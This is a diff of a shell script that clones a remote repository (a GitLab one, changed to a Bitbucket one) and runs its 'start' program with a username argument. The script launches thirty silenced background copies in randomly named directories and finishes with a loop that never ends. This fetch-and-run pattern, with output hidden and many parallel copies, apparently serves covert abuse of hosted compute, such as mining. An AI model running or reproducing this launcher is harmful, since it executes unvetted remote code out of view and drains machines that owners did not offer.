@@ -1,142 +1,182 @@
 USERNAME=$1
-mkdir 1 
-cd 1
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 2
-cd 2
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 3 
-cd 3
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 4
-cd 4
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 5
-cd 5
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 6
-cd 6
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 7 
-cd 7
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 8
-cd 8
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 9
-cd 9
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 10
-cd 10
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 11
-cd 11
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 12
-cd 12
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 13
-cd 13
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 14
-cd 14
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 15
-cd 15
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 16
-cd 16
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 17
-cd 17
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 18
-cd 18
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 19
-cd 19
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-mkdir 20
-cd 20
-git clone https://gitlab.com/breni9087/satpol-github.git
-cd satpol-github
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
-cd ..
-sleep 6h
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+mk=$(shuf -n 1 -i 1-99999)
+mkdir $mk && cd $mk
+git clone https://bitbucket.org/seaguardian/guardian5
+cd guardian5
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 60; done
